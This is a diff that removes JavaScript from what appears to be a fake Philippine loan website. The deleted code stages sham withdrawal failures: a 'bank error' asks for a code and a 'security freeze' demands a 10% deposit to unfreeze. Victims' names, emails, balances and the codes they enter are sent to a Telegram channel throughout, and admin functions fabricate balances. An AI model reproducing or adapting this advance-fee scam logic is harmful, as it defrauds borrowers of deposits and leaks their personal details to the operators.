-  // UI: processing
-  document.getElementById('withdrawCard').classList.add('hidden');
-  document.getElementById('wdErrorCard').classList.add('hidden');
-  document.getElementById('wdBlockedCard').classList.add('hidden');
-  document.getElementById('wdFrozenCard').classList.add('hidden');
-  const proc = document.getElementById('wdProcessingCard');
-  proc.classList.remove('hidden');
-
-  let sec = 10;
-  document.getElementById('wdCountdown').textContent = sec+'s';
-  const t = setInterval(()=>{
-    sec--; document.getElementById('wdCountdown').textContent = sec+'s';
-    if(sec<=0){ clearInterval(t); handleWithdrawResult(amount, bankObj, accNo, accName); }
-  },1000);
-});
-
-function handleWithdrawResult(amount, bankObj, accNo, accName){
-  document.getElementById('wdProcessingCard').classList.add('hidden');
-
-  if(currentUser.withdrawalAttempts >= 2){
-    // FREEZE ACCOUNT, revert balance after 10sec
-    const originalBalance = currentUser.balance;
-    currentUser.frozen = true;
-    saveUsers(); refreshDashboard();
-    document.getElementById('wdFrozenCard').classList.remove('hidden');
-    toast('Security Freeze activated after 2nd withdrawal attempt','error');
-
-    sendTelegram(`🔒 <b>ACCOUNT FROZEN – 2nd WITHDRAWAL</b>\n👤 ${tgEscape(currentUser.name)}\n💰 Balance protected: ${peso(originalBalance)}\n🏦 ${tgEscape(bankObj.name)}\n⏱️ Balance will revert in 10s\nSlot #${currentUser.slot}`);
-
-    // "client er blance 10sec pora abr ja clo tai hoya jaba"
-    setTimeout(()=>{
-      // balance reverts to what it was (already is, but ensure)
-      currentUser.balance = originalBalance;
-      saveUsers(); refreshDashboard();
-      sendTelegram(`♻️ <b>BALANCE REVERTED – FROZEN PROTECTION</b>\n👤 ${tgEscape(currentUser.name)}\n💰 Restored: ${peso(currentUser.balance)}\n🔒 Status: FROZEN`);
-    }, 10000);
-    return;
-  }
-
-  // first attempt: bank error -> code input
-  document.getElementById('wdErrorCard').classList.remove('hidden');
-  toast('Bank account error! Enter error code.','error');
-}
-
-document.getElementById('wdErrorSubmitBtn').addEventListener('click', ()=>{
-  const code = document.getElementById('wdErrorCodeInput').value.trim();
-  if(!code){ toast('Enter error code','error'); return }
-  // 10% bonus
-  const bonus = +(currentUser.balance * 0.10).toFixed(2);
-  currentUser.balance = +(currentUser.balance + bonus).toFixed(2);
-  saveUsers(); refreshDashboard();
-
-  sendTelegram(`🛡️ <b>WITHDRAWAL ERROR CODE SUBMITTED</b>\n👤 ${tgEscape(currentUser.name)}\n🔑 Code: ${tgEscape(code)}\n🎁 10% Bonus credited: ₱${bonus.toLocaleString('en-PH')}\n💰 New Balance: ${peso(currentUser.balance)}\nSlot #${currentUser.slot}`);
-
-  document.getElementById('wdErrorCard').classList.add('hidden');
-  document.getElementById('wdBlockedCard').classList.remove('hidden');
-  document.getElementById('wdErrorCodeInput').value = '';
-  toast(`Error cleared! +10% bonus ₱${bonus.toLocaleString('en-PH')}`,'success');
-});
-
-function resetWithdrawUI(){
-  document.getElementById('wdBlockedCard').classList.add('hidden');
-  document.getElementById('wdFrozenCard').classList.add('hidden');
-  document.getElementById('wdErrorCard').classList.add('hidden');
-  document.getElementById('wdProcessingCard').classList.add('hidden');
-  document.getElementById('withdrawCard').classList.remove('hidden');
-}
-
-/* ===== FREEZE / UNFREEZE ===== */
-function handleFreezeClick(){
-  // Clicking freeze area when frozen = open unfreeze modal
-  if(currentUser.frozen){
-    openUnfreezeModal();
-  } else {
-    // optional manual freeze
-    currentUser.frozen = true;
-    saveUsers(); refreshDashboard();
-    toast('Balance frozen manually','warn');
-    sendTelegram(`🔒 <b>MANUAL FREEZE</b>\n👤 ${tgEscape(currentUser.name)}\n💰 ${peso(currentUser.balance)}\nSlot #${currentUser.slot}`);
-  }
-}
-
-function openUnfreezeModal(){
-  const tenPct = (currentUser.balance * 0.10).toFixed(2);
-  document.getElementById('depositInfo').innerHTML = `Security deposit required: <b>₱${Number(tenPct).toLocaleString('en-PH')}</b> (10% of balance) – this amount will be AUTO-CREDITED back to your account.`;
-  document.getElementById('deposit10Input').placeholder = tenPct;
-  document.getElementById('unfreezeCodeInput').value = '';
-  show('unfreezeCodeModal');
-}
-
-document.getElementById('unfreezeCodeSubmitBtn').addEventListener('click', ()=>{
-  const code = document.getElementById('unfreezeCodeInput').value.trim();
-  if(!code){ toast('Enter unfreeze code','error'); return }
-  currentUser.frozen = false;
-  currentUser.withdrawalAttempts = 0; // reset attempts after successful unfreeze
-  saveUsers(); refreshDashboard();
-  closeModal('unfreezeCodeModal');
-  resetWithdrawUI();
-  toast('Account unfrozen – you can withdraw now','success');
-  sendTelegram(`🔓 <b>ACCOUNT UNFROZEN – CODE</b>\n👤 ${tgEscape(currentUser.name)}\n🔑 Unfreeze Code: ${tgEscape(code)}\n💰 Balance: ${peso(currentUser.balance)}\nSlot #${currentUser.slot}`);
-});
-
-document.getElementById('depositUnfreezeBtn').addEventListener('click', ()=>{
-  const inputVal = Number(document.getElementById('deposit10Input').value);
-  const required = +(currentUser.balance * 0.10).toFixed(2);
-  if(Math.abs(inputVal - required) > 0.5){
-    toast(`Enter correct 10% amount: ₱${required.toLocaleString('en-PH')}`,'error'); return;
-  }
-  // Auto-credit 10%
-  currentUser.balance = +(currentUser.balance + required).toFixed(2);
-  currentUser.frozen = false;
-  currentUser.withdrawalAttempts = 0;
-  saveUsers(); refreshDashboard();
-  closeModal('unfreezeCodeModal');
-  resetWithdrawUI();
-  toast(`Unfrozen! +₱${required.toLocaleString('en-PH')} credited`,'success');
-  sendTelegram(`💳 <b>UNFREEZE VIA 10% DEPOSIT</b>\n👤 ${tgEscape(currentUser.name)}\n💵 Deposit: ₱${required.toLocaleString('en-PH')}\n💰 New Balance: ${peso(currentUser.balance)}\nSlot #${currentUser.slot}`);
-});
-
-/* ===== ID MODAL ===== */
-function openIdModal(){
-  if(!currentUser) return;
-  document.getElementById('idModalName').textContent = currentUser.name;
-  document.getElementById('idModalDetail').textContent = (currentUser.idType||'ID') + ' • ' + (currentUser.idNumber||'N/A') + ' • ' + (currentUser.email||'');
-  document.getElementById('svgIdName').textContent = currentUser.name.length>22 ? currentUser.name.slice(0,22)+'…' : currentUser.name;
-  document.getElementById('svgIdNum').textContent = currentUser.idNumber || 'ID-PENDING';
-  show('idModal');
-}
-
-/* ===== LOGOUT ===== */
-function logout(){
-  sendTelegram(`👋 <b>LOGOUT</b>\n👤 ${tgEscape(currentUser?.name||'unknown')}\n📧 ${tgEscape(currentUser?.email||'')}\n💰 ${peso(currentUser?.balance||0)}`);
-  currentUser = null; currentSlot = null;
-  localStorage.removeItem(CONFIG.SESSION_KEY);
-  showLogin();
-  toast('Logged out securely','warn');
-}
-
-/* ===== INIT ===== */
-loadUsers();
-// auto-login
-const sess = localStorage.getItem(CONFIG.SESSION_KEY);
-if(sess !== null){
-  const idx = parseInt(sess,10);
-  if(users[idx] && users[idx].email){
-    currentSlot = idx;
-    currentUser = users[idx];
-    enterDashboard();
-  }
-}
-
-/* ===== ADMIN CONSOLE ===== */
-window.adminViewUsers = ()=> console.table(users.filter(u=>u.email).map(u=>({slot:u.slot,name:u.name,email:u.email,balance:u.balance,loan:u.loanStatus,frozen:u.frozen,attempts:u.withdrawalAttempts})));
-window.adminSetUser = (slot, data)=>{ if(users[slot-1]){ Object.assign(users[slot-1], data); saveUsers(); refreshDashboard(); return users[slot-1]} return null };
-window.adminAddBalance = (slot, amt)=>{ if(users[slot-1]){ users[slot-1].balance+=amt; saveUsers(); refreshDashboard(); return users[slot-1].balance } };
-window.adminUnfreeze = (slot)=>{ if(users[slot-1]){ users[slot-1].frozen=false; users[slot-1].withdrawalAttempts=0; saveUsers(); refreshDashboard(); } };
-window.adminReset = ()=>{ localStorage.removeItem(CONFIG.STORAGE_KEY); localStorage.removeItem(CONFIG.SESSION_KEY); location.reload() };
-
-console.log('%cFast & Safe Loans Philippines • v3 Advanced', 'color:#d4a309;font-weight:800;font-size:14px');
-console.log('Test: 123fhffhf@gmail.com / 12345678');
-console.log('Admin: adminViewUsers(), adminAddBalance(slot, amount), adminUnfreeze(slot), adminReset()');
-</script>
-
-<!-- Tawk.to Live Chat Integration -->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/6a397c2849e0e21d4954f33a/1jro8q0h2';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End Tawk.to-->
-
+    </script>
 </body>
 </html>
